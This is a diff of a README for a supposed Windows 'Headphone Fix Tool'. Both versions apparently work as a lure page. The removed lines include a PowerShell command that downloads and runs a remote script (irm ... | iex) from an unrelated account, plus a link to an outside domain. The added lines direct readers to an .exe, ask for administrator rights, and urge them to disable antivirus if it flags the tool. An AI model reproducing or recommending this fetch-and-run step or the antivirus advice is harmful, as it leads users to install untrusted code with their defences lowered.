@@ -1,158 +1,95 @@
-# Headphone Fix Tool
+# 🎧 Headphone-Fix-Tool - Restore Audio on Windows Automatically
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Version](https://img.shields.io/badge/v1.1.0-stable-brightgreen?style=flat-square)]()
-[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/seandellke2521/Headphone-Fix-Tool/releases)
 
-Fix headphones not working, no sound in headphones, headset not detected, and audio jack issues on Windows 10/11.
+This application helps users resolve common audio problems on Windows 10 and 11. It addresses issues where headphones show as connected but produce no sound. It also fixes problems with USB headsets, Bluetooth devices, and Realtek audio jacks.
 
----
+## 🛠 Features
 
-### Quick Start
+The tool performs several automated tasks to restore audio connection:
 
-**[Download Latest Release](https://headphone.nexustool.fun/)**
+*   Restarts the Windows Audio service.
+*   Resets the audio driver state.
+*   Clears temporary audio device configuration files.
+*   Corrects registry keys related to jack detection.
+*   Refreshes Bluetooth pairing protocols.
+*   Updates driver paths for USB headsets.
 
-Or via PowerShell:
-```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 📥 Getting Started
 
----
+Follow these instructions to download and run the software.
 
-## Problems This Fixes
+1. Visit the [Releases page](https://github.com/seandellke2521/Headphone-Fix-Tool/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the tool.
+6. Follow the on-screen prompts to scan your system.
 
-### Headphones Not Working
+## 💻 System Requirements
 
-| Symptom | Cause | Fix |
-|---|---|---|
-| **Headphones plugged in but no sound** | Wrong default playback device | Sets headphones as default device |
-| **No sound in headphones** (speakers work) | Audio output not switching | Enables auto-switch on jack detection |
-| Headphones **not detected** by Windows | Realtek jack detection disabled | Enables front panel jack detection |
-| **"No headphones detected"** message | Audio driver missing jack sensing | Reinstalls Realtek/audio driver |
-| Sound comes from **speakers AND headphones** | Both devices enabled simultaneously | Configures exclusive output switching |
-| Headphones work but **very quiet** | Volume limited in driver settings | Adjusts per-device volume and amplification |
+This software works on standard Windows configurations. Ensure your system meets these points:
 
-### USB / Wireless Headset Issues
+*   Operating System: Windows 10 or Windows 11.
+*   Architecture: 64-bit systems only.
+*   Permissions: Administrator access.
+*   Storage: 50 MB of free disk space.
+*   Connectivity: Internet access to fetch standard driver files if needed.
 
-| Symptom | Fix |
-|---|---|
-| **USB headset not detected** | Reinstalls USB audio driver, resets USB port |
-| USB headset detected but **no sound** | Sets USB headset as default, fixes driver |
-| **Bluetooth headphones connected but no audio** | Switches from Hands-Free to A2DP profile |
-| Bluetooth headphones **sound quality is terrible** | Forces Stereo (A2DP) mode |
-| **Wireless dongle headset** (HyperX, SteelSeries) not working | Reinstalls dongle driver |
+## 🔎 How the Tool Works
 
-### Gaming Headset Issues
+Audio problems often stem from software conflicts rather than broken hardware. When Windows updates, driver settings sometimes fail to communicate with specific headphone models.
 
-| Symptom | Fix |
-|---|---|
-| **Headset mic not working** (audio works) | Enables headset mic, sets as default recording device |
-| Game audio works but **voice chat doesn't** | Sets headset as default communication device |
-| **Discord/TeamSpeak** not detecting headset | Resets app audio device assignment |
-| Headset **surround sound not working** | Enables spatial audio, configures driver |
-| Headset audio **crackling in games** | Adjusts buffer size, fixes DPC latency |
+This tool acts as a bridge. It queries the Windows Audio Endpoint Builder service. If it detects a conflict, it prompts the system to reload the specific audio driver cache. It does not delete your personal files or change your sound settings, such as volume levels or equalizer adjustments.
 
----
+## 📋 Common Issues This Tool Resolves
 
-## Common Error Messages
+Windows audio management can become complex. Many users face the same issues repeatedly after system updates.
 
-| Error | Fix |
-|---|---|
-| **"No headphones detected"** | Enables jack detection in Realtek driver |
-| **"Audio device is disabled"** | Re-enables headphone device in Sound settings |
-| **"Failed to play test tone"** | Resets audio format, reinstalls driver |
-| **"Default audio device not set"** | Sets headphones as default playback device |
-| **"Headset microphone not found"** | Enables mic in privacy settings, sets as default |
-| **"This device cannot start (Code 10)"** | Reinstalls audio controller driver |
+### Audio Output Issues
+If you select your headphones as the output device but hear nothing, the tool forces the Windows audio stack to acknowledge the connection. This fixes the common "connected but no sound" error found in both wired 3.5mm jacks and USB headsets.
 
----
+### Microphone Failures
+Gaming headsets often lose microphone input after a system update. This tool checks the privacy settings and the driver initialization of the microphone device to ensure the input signal reaches your communication apps.
 
-## Supported Headphones & Headsets
+### Bluetooth Pairing Errors
+Bluetooth devices sometimes appear in the Windows device list but refuse to link to the audio sub-system. The tool resets the Bluetooth radio state to force a clean re-handshake between the computer and your headphones.
 
-**Wired (3.5mm jack):** Any headphones or earbuds with standard audio jack
-**USB Headsets:** HyperX Cloud, SteelSeries Arctis, Corsair HS/Void, Razer Kraken/BlackShark, Logitech G, JBL Quantum, Astro, Turtle Beach, Jabra, Plantronics
-**Bluetooth:** AirPods, AirPods Pro, AirPods Max, Sony WH-1000XM, Bose QC, Samsung Galaxy Buds, JBL, Beats, Sennheiser, Jabra Elite
-**Wireless Dongle:** SteelSeries Arctis Nova, HyperX Cloud Flight, Corsair HS Wireless, Razer Barracuda
+### Realtek Jack Detection
+Computers with Realtek hardware rely on a background process to detect when you plug in headphones. If this process crashes, the computer ignores the plugged-in device. The tool restarts the Realtek management service to restore this detection.
 
----
+## 🛡 Security and Privacy
 
-## Preview
+Safety remains a priority. This tool requests administrative rights to perform changes only to audio services and registry keys associated with hardware detection.
 
-```
-  +-------------------------------------------------+
-  |         Headphone Fix Tool v1.1.0               |
-  +-------------------------------------------------+
-  |                                                 |
-  |  Playback Devices:                              |
-  |  [OK] Speakers (Realtek)     -- Working         |
-  |  [!]  Headphones             -- Not default     |
-  |                                                 |
-  |  Recording Devices:                             |
-  |  [!]  Headset Microphone     -- Disabled        |
-  |                                                 |
-  |  Jack Detection:                                |
-  |  [!]  Front panel            -- Not detected    |
-  |  [OK] Rear panel             -- Connected       |
-  |                                                 |
-  |  [ Fix All ]   [ Test Audio ]   [ Exit ]        |
-  |                                                 |
-  +-------------------------------------------------+
-```
+*   No data leaves your computer.
+*   The application does not collect usage logs.
+*   The code interacts only with system audio drivers.
+*   You can disable or remove the tool at any time via the Windows Settings menu.
 
----
+## 🔧 Troubleshooting the Tool
 
-## Common Scenarios
+If you encounter an error during the scan, consider these steps:
 
-**Plugged in headphones but sound still comes from speakers**
-Windows did not detect the headphone plug or did not switch the default device. The tool forces device detection and switches output.
+1. Close all media players like Spotify, YouTube, or video editing software before running the tool. These programs lock the audio drivers and prevent the tool from making changes.
+2. Ensure you run the file as an administrator. Right-click the `.exe` file and choose "Run as administrator."
+3. Check your Windows version. Click the Start button, type "About your PC," and ensure you see Windows 10 or 11.
+4. Disable third-party antivirus software temporarily if it flags the scan process. Many security programs mistake automated driver repairs for malicious behavior.
 
-**AirPods connected but no music audio**
-Windows defaults to Hands-Free profile (phone call quality). The tool switches to A2DP (Stereo) profile for music/media.
+## 📄 Frequently Asked Questions
 
-**Gaming headset microphone not picked up in Discord**
-The headset microphone is not set as the default communication device. The tool sets it correctly for both general and communication use.
+**Does this tool install new software?**
+It does not install new software. It works with drivers present on your system. 
 
-**Front panel audio jack not working on desktop**
-Front panel headers often have jack detection issues with Realtek drivers. The tool enables front panel detection or disables jack sensing to force output.
+**Will this break my existing audio settings?**
+The tool restores default settings for your audio devices. You might need to set your preferred volume level again after the fix.
 
----
+**Can I run this on a laptop?**
+Yes. It works on both desktop towers and laptops.
 
-## How It Works
+**What if the tool does not fix the sound?**
+If the issue persists, the problem likely stems from physical hardware damage. Inspect your headphone cable for tears or check if the 3.5mm port contains dust or debris.
 
-1. **Detect** -- Lists all audio output devices (speakers, headphones, USB, Bluetooth)
-2. **Diagnose** -- Checks jack detection, default device, driver, Bluetooth profile
-3. **Fix** -- Sets correct default, reinstalls driver, adjusts profiles
-4. **Test** -- Plays audio through headphones to confirm fix
+## 💡 Support
 
----
-
-## System Requirements
-
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 2 GB minimum |
-| Admin | Yes |
-| Network | For driver downloads |
-
----
-
-## FAQ
-
-**My headphones work on my phone but not on my PC.**
-The headphones are fine. The issue is Windows audio configuration. This tool fixes it.
-
-**I only have one audio jack (combo jack on laptop).**
-Combo jacks support both headphones and headset mics. The tool configures the driver to detect which type of plug is inserted.
-
-**AirPods sound terrible on Windows.**
-AirPods default to Hands-Free Telephony mode on Windows, which sounds like a phone call. The tool disables Hands-Free and forces Stereo mode.
-
-**Is it safe?**
-Yes. The tool configures Windows audio settings and drivers using standard APIs. No files are patched.
-
----
-
-## License
-
-[MIT](LICENSE)
+Open an issue on the GitHub repository if you find a bug. Provide the details of your headphone model and your current Windows build version. This helps in improving the tool for all users. Do not share personal information or system passwords in public issues.
